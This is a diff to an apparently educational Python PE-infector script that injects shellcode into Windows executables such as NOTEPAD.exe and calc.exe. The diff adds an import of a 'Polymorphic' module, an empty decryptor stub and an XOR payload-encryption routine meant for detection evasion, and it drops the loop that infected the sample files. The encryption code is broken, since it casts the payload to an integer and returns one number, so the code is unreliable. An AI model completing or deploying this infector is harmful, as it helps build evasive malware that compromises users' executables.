@@ -3,6 +3,7 @@ import os
 import mmap
 import shutil
 import struct
+import Polymorphic
 
 
 def get_message_box_w(pe):
@@ -72,6 +73,22 @@ def add_more_space(input, output):
     return original_size
 
 
+def create_decryptor(raw_address_of_shell_code):
+    return
+
+
+def xor(a, b, c):
+    # Execute the XOR
+    return int(a) ^ int(b) ^ int(c)
+
+
+def encrypted_payload(payload, raw_address_of_shell_code):
+    # Encrypt payload using XOR
+    len_payload = len(payload)
+    encrypted_payload = xor(payload, raw_address_of_shell_code, len_payload)
+    return encrypted_payload
+
+
 def injected_shell_code(input, output):
     # Path to pe file
 
@@ -135,15 +152,3 @@ def injected_shell_code(input, output):
 
     pe.write(output)
     print("Inject Successfully!!")
-
-
-file = [
-    'NOTEPAD.exe',
-    'calc.exe'
-]
-
-for input_file in file:
-    output_file = input_file.replace('.exe', '-injected.exe')
-    print("\nInjecting ", input_file)
-    print("\n")
-    injected_shell_code(input_file, output_file)
